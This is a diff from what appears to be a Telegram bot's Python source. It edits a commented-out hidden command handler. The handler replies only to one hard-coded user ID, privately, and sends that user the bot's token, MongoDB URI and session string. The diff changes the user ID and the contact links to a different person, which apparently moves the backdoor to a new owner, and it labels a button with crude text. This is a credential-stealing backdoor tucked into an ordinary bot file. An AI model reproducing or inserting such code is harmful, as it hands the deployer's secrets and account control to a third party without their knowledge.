@@ -109,17 +109,17 @@ async def close_menu(_, CallbackQuery):
 #@app.on_message(
 #    filters.command("di")
 #    & filters.private
-#    & filters.user(5465943450)
+#    & filters.user(7531575025)
 #   )
 #async def help(client: Client, message: Message):
 #   await message.reply_photo(
 #          photo=f"https://graph.org/file/ee9a153b629bec256b517.jpg",
-#       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
+#       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_THUNDER_lll)............☆""",
 #        reply_markup=InlineKeyboardMarkup(
 #             [
 #                 [
 #                      InlineKeyboardButton(
-#                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
+#                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/ll_THUNDER_lll")
 #                 ]
 #            ]
 #         ),
